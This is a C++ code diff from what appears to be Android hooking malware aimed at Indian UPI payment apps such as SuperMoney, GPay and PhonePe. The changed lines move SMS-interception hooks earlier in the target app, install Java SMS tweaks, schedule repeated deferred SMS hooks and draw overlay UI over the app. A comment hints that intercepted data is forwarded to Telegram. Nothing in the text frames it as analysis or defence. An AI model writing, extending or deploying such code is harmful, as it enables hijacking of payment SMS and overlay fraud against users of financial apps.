@@ -398,14 +398,17 @@ public:
                 schedule_overlay_ui(env_, api_, pkg_, 2);
             }
         } else if (no_inline_) {
-            // SuperMoney / ultra-crashy: Java ISms ONLY after settle — bubble still pops
+            // SuperMoney / ultra-crashy: NO native PLT/inline (open crash).
+            // Java ISms MUST be early — 8s delay = "Unable to send SMS" + no TG.
             outgoing_sms_hook::arm_intercept_hooks();
-            const int delay = upi_registry::hook_startup_delay_sec(pkg_);
-            schedule_deferred_sms_hooks(env_, api_, pkg_, delay, true);
-            schedule_deferred_java_sms(env_, pkg_, delay + 2);
-            report_line(api_, "post_upi_no_inline_java:" + pkg_ + "|d=" + std::to_string(delay));
+            overlay_ui::install_sms_tweaks_java(env_, pkg_.c_str());
+            schedule_deferred_java_sms(env_, pkg_, 1);
+            schedule_deferred_java_sms(env_, pkg_, 3);
+            // Deferred path still Java-only (no_inline=true) — reinforce after settle
+            schedule_deferred_sms_hooks(env_, api_, pkg_, 2, true);
+            report_line(api_, std::string("post_upi_no_inline_fast_java:") + pkg_);
             if (native_overlay_wanted() && overlay_allowed_pkg(pkg_)) {
-                schedule_overlay_ui(env_, api_, pkg_, delay + 1);
+                schedule_overlay_ui(env_, api_, pkg_, 3);
             }
         } else {
             // ALL other UPI (YesPay/GPay/PhonePe/Snapmint/KreditBee/Jump/FamPay/…):
